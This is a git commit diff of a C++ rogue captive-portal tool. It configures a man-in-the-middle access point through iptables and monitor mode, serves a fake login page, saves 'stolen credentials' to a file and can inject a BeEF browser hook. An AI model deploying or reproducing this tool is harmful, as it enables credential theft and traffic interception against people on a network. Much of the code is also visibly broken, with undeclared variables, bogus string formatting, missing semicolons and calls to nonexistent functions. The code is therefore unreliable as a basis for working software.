38a000764478b0a5d50b7feb195c5424a69b6a1c
flyingfishfuse <46322912+flyingfishfuse@users.noreply.github.com>
2019-01-22 16:02:18 -0600

    Add files via upload

--- captiveportal.cpp
+++ captiveportal.cpp
@@ -12,11 +12,16 @@
 #include <cstdlib>
 #include <bits/stdc++.h>
 #include <stdlib.h>
-#include <boost/asio/ip/address.hpp>
 #include <boost/network/uri.hpp>
 //libhttpserver for debian
 #include <httpserver.hpp>
+#include <curses.h>
+#include <thread>
+#include <unistd.h>
 #include "termcolor.hpp"
+
+//currently refactoring to colorprint to the output_buffer
+
 //g++ -L/usr/include/boost/program_options.hpp ./main.cpp -o ./main.o -lboost_program_options -lboost_system -lboost_filesystem -lhttpserver -lboost_process -lboost_network
 //namespace process = boost::process;
 using namespace std;
@@ -38,9 +43,17 @@ std::string html_redirect_body;
 std::string html_form_body;
 std::string hook_location;
 std::string redirect_ip;
+std::string remote_ip;
 std::string beef_hook;
 std::string addr;
 std::string iface;
+WINDOW* window;
+WINDOW* output_window;
+WINDOW* input_window;
+int row = 0, col = 0;
+std::vector<string> output_buffer;
+std::vector<char> input_buffer;
+std::bool INPUT_FLAG;
 
 void colorprint(std::string color, std::string text) {
     if (color == "red"){
@@ -62,9 +75,68 @@ void colorprint(std::string color, std::string text) {
     };
 };
 
+void term_init(){
+    win = initscr();
+    getmaxyx(window, row, col);
+    cbreak();
+    noecho();
+    nonl();
+    intrflush(stdscr, FALSE);
+    keypad(stdscr, TRUE);
+    refresh();
+};
+
 void errprint(auto err) {
     colorprint("red" , err);
 };
+
+
+void update_output_window(std::string output_string ){
+    touchwin(window);
+    str += '\n';
+    wprintw(output_window, output_string.c_str());
+    wrefresh(output_window);
+// once we update the output window we want to allow the user to input more commands
+// so we set the flag to false again
+    INPUT_FLAG = false;
+};
+
+void update_input_window(std::string input){
+    touchwin(window);
+    str += '\n';
+    wprintw(input_window, input.c_str() );
+    wrefresh(output_window);
+
+};
+
+void process_output_buffer(){
+    std::string output_window_string(output_buffer.begin(),output_buffer.end())
+    update_output_window(output_window_string)
+};
+
+string get_command(){
+    while (INPUT_FLAG == true) {
+        char input_character = getch();
+        //if we hit the enter key, it processes the input buffer to send to the output buffer to send to the output window
+        if(input_character = '\r'){
+            std::string input_buffer_string(input_buffer.begin(),input_buffer.end())
+            process_output_buffer();
+            update_output_window(input_buffer_string + "\n");
+            INPUT_FLAG = true;
+        } else {
+            //else we keep taking chars and checking for the backspace
+            touchwin(window);
+            input_buffer.push_back(input_character);
+            waddch(input_window, input_character);
+            if (input_character == KEY_BACKSPACE) { input_buffer.pop_back(); update_input_window() };
+        };
+    };
+    std::string command(input_buffer.begin(),input_buffer.end());
+    input_buffer.clear();
+    return command;
+};
+
+
 
 void make_html(std::string hook_loc, std::string formaction){
     std::string html_login_head ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
@@ -86,26 +158,9 @@ void make_html(std::string hook_loc, std::string formaction){
 };
 
 
-void  setMac(char * mac) {
-//i stole this
-	char cmd[64];
-	char nwkInf[5]="eth0";
-	memset(cmd,0X00,64);
-	sprintf((char *)cmd,(const char *)"ip link set %s down",nwkInf);
-	system((const char *)cmd);
-	usleep(500);
-	memset(cmd,0X00,64);
-	sprintf((char *)cmd,(const char *)"ifconfig %s hw ether %s",nwkInf,mac);
-	system((const char *)cmd);
-	usleep(500);
-	memset(cmd,0X00,64);
-	sprintf((char *)cmd,(const char *)"ip link set %s up",nwkInf);
-	system((const char *)cmd);
-	usleep(500);
-};
-
 int parse_commandline(int argc, char* argv[]){
-    options::options_description desc("Captive portal server, very insecure and not for beginners, if you have a problem, solve it. If you get hacked while using this, too bad");
+    options::options_description desc("Captive portal server, very insecure and not for beginners, if you have a problem, solve it.\n\
+                                      If you get hacked while using this, too bad. There is no help on this , read the source code");
     desc.add_options()
         ("help,h", "Print Help Message" )
         ("address,a", options::value<std::string >()->default_value("192.168.0.1"), "IP address to use (this is the router on the LAN, Were doing an MITM!)" )
@@ -114,7 +169,9 @@ int parse_commandline(int argc, char* argv[]){
         ("beef-hook,b", options::value< std::string >()->default_value("false"), "Trigger for beef" )
         ("credentials,c", options::value<std::string>()->default_value("credentials.txt"), "Filename to save the stolen credentials to")
         ("external-html,e", options::value<std::string>()->default_value("false"), "switch for serving external document instead of internal form. type 'true' OR NOTHING")
-        ("document-root,d", options::value<std::string>()->default_value("/"), "Document root of the server if using an external html")
+        ("document-root,d", options::value<std::string>()->default_value("/"), "Document root of the server if using an external html, you must modify \n\
+                                                                                the source of the portal you wish to use to be successful. Serves a subdirectory \n\
+                                                                                of the PWD the program runs in")
 
     ;
     options::variables_map arguments;
@@ -133,8 +190,13 @@ int parse_commandline(int argc, char* argv[]){
     if (arguments.count("beef-hook") == 'true') {
         hook_location = arguments["address"].as<std::string>();
         hook_location = hook_location + ":3000";
+        system("service beef start")
     } else {
         hook_location = "";
+    };
+    if (arguments.count("external-html") == 'true') {
+        auto pwd = filesystem::current_path();
+        document_root = pwd + arguments
     };
     document_root = arguments["document-root"].as<std::string>();
     credentials_file = arguments["credentials"].as<std::string>();
@@ -146,26 +208,24 @@ int parse_commandline(int argc, char* argv[]){
 class CaptivePortal : public http_resource {
 public:
     const std::shared_ptr<http_response> render_GET(const http_request& request) {
+        colorprint("yellow", ("redirecting %remoteip to portal", ))
         return std::shared_ptr<http_response>(new string_response(html_redirect_body));
-
     };
 
     const std::shared_ptr<http_response> render_POST(const http_request& request) {
-        authpassthrough(request.get_requestor());
+        remote_ip = request.get_requestor();
+
+        authpassthrough(remote_ip);
+        colorprint("green", ("Host %host Authorized", remote_ip))
         save_credentials(request.get_user(), request.get_pass());
         return std::shared_ptr<http_response>(new string_response("you may now browse freely, I stole your password!"));
     };
 
-    void authpassthrough(std::string remote_ip){
-        std::string ipt1 = "iptables -t nat -I PREROUTING 1 -s " + remote_ip + " -j ACCEPT";
-        std::string ipt2 = "iptables -I FORWARD -s " + remote_ip + "-j ACCEPT";
-        const char *iptsyscall1 = ipt1.c_str();
-        const char *iptsyscall2 = ipt2.c_str();
-        system(ipt1.c_str());
-        system(ipt2.c_str());
-        //^^^^WHY DOES IT NOT COMPILE IF I DONT DO THIS?!?!?!
-    //self.wfile.write("You are now authorized. Navigate to any URL")
+    void authpassthrough(std::string remoteip){
+        system(("iptables -t nat -I PREROUTING 1 -s $remoteip -j ACCEPT", remoteip).c_str());
+        system(("iptables -I FORWARD -s %remoteip-j ACCEPT", remoteip).c_str());
     };
+
     int save_credentials(std::string username, std::string password){
         try {
             std::string name = username;
@@ -206,10 +266,10 @@ void start_server(){
 
 int establish_MITM(std::string netiface, std::string ip_addr, std::string port){
 
-    system(("ip link set %iface down", netiface).c_str());
-    system(("ip addr add %ip dev %iface", ip_addr, netiface).c_str());
+    system(("ip link set %i down", netiface).c_str());
+    system(("ip addr add %a dev %i", ip_addr, netiface).c_str());
     try {
-        system(("iwconfig %s mode monitor", netiface).c_str());
+        system(("iwconfig %i mode monitor", netiface).c_str());
         colorprint("green" , "[+] Monitor Mode Enabled");
         } catch (std::exception& e) {
             auto errortext = e.what();
@@ -217,7 +277,7 @@ int establish_MITM(std::string netiface, std::string ip_addr, std::string port){
             colorprint("yellow" , "[-] Failed to set monitor mode");
             return 1;
         };
-    system(("ip link set %iface up", netiface).c_str());
+    system(("ip link set %i up", netiface).c_str());
 
     colorprint("green" ,"[+]Clearing IP Tables Rulesets");
     system("iptables -w 3 --flush");
@@ -229,13 +289,13 @@ int establish_MITM(std::string netiface, std::string ip_addr, std::string port){
     system("echo 1 > /proc/sys/net/ipv4/ip_forward");
 
     colorprint("green" ,"[+]Setup a NAT environment");
-    system(("iptables -w 3 --table nat --append POSTROUTING --out-interface {0} -j MASQUERADE", netiface).c_str());
+    system(("iptables -w 3 --table nat --append POSTROUTING --out-interface %i -j MASQUERADE", netiface).c_str());
 
     colorprint("yellow" , ".. Block all traffic in");
-    system(("iptables -w 3 -A FORWARD -i %iface -j DROP", netiface).c_str());
+    system(("iptables -w 3 -A FORWARD -i %i -j DROP", netiface).c_str());
 
     colorprint("green" ,"[+]allow incomming from the outside on the monitor iface");
-    system(("iptables -w 3 --append FORWARD --in-interface %iface -j ACCEPT", netiface).c_str());
+    system(("iptables -w 3 --append FORWARD --in-interface %i -j ACCEPT", netiface).c_str());
 
     colorprint("green" ,"[+]allow UDP DNS resolution inside the NAT  via prerouting");
     system(("iptables -w 3 -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to ", ip_addr).c_str());
@@ -255,28 +315,50 @@ int establish_MITM(std::string netiface, std::string ip_addr, std::string port){
 
     colorprint("green" ,"[+]Drop Invalid Packets");
     system("iptables -w 3 -A INPUT -m conntrack --ctstate INVALID -j DROP");
-    system("iptables -w 3 -A FORWARD -i %iface -p tcp --dport 53 -j ACCEPT");
-    system("iptables -w 3 -A FORWARD -i %iface -p udp --dport 53 -j ACCEPT");
+    system("iptables -w 3 -A FORWARD -i %i -p tcp --dport 53 -j ACCEPT");
+    system("iptables -w 3 -A FORWARD -i %i -p udp --dport 53 -j ACCEPT");
 
     colorprint("yellow" , ".. Allow traffic to captive portal");
-    system(("iptables -w 3 -A FORWARD -i %iface -p tcp --dport %port -d %ip_addr -j ACCEPT", netiface, port, ip_addr).c_str());
+    system(("iptables -w 3 -A FORWARD -i %i -p tcp --dport %p -d %i -j ACCEPT", netiface, port, ip_addr).c_str());
 /*   ###################################################
     #
     #       HERE IS WHERE THE WERVER IS STARTED
     #
     #
     ###################################################*/
-    colorprint("green" ,"Starting web server");
-    start_server();
     colorprint("green" ,"Redirecting HTTP traffic to captive portal");
-    system(("iptables -t nat -A PREROUTING -i %iface -p tcp --dport 80 -j DNAT --to-destination %dest", netiface, ip_addr).c_str());
+    system(("iptables -t nat -A PREROUTING -i %i -p tcp --dport 80 -j DNAT --to-destination %d", netiface, ip_addr).c_str());
 
 };
-
 int main(int argc, char* argv[]) {
+    ninit();
     auto pwd = filesystem::current_path();
-    parse_commandline(argc, argv);
 
+    parse_commandline(argc, argv);
+    fflush(stdin);
+
+    start_server();
+
+    INPUT_FLAG = true;
+    output_window = subwin(win, row - 1, col, 0, 0);
+
+    scrollok(output_window, true);
+    input_window = subwin(window, 1, col, row - 1, 0);
+
+    std::thread input_line(get_command);
+    std::thread nthr(nmonitor);
+
+    while(1)
+    {
+        std::string input(throw_command());
+        if(input == "quit")
+            break;
+        else
+            update_user_input("[root@moopframe:> %s", input.c_str());
+    }
+
+    getch();
+    endwin();
 };
 
 
